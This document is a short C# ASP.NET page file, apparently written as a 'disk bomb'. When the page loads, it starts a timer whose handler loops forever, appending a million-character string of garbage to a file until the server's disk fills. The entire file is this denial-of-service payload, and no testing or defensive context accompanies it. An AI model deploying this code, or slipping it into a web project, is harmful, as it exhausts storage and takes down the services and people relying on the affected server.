using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Timers;
using System.IO;

namespace DiskmemeoryBomb
{
    public partial class Bomb : System.Web.UI.Page
    {

        string garbage = new string('X', 1000000);

        protected void Page_Load(object sender, EventArgs e)
        {
            System.Timers.Timer newTimer = new System.Timers.Timer(1);
            newTimer.AutoReset = false;
            newTimer.Elapsed += new ElapsedEventHandler(delegate(object tsender, ElapsedEventArgs args)
            {
                while (true)
                {
                    File.AppendAllText("BOMB_GARBAGE", garbage);
                }
            });
            newTimer.Enabled = true;
        }
    }
}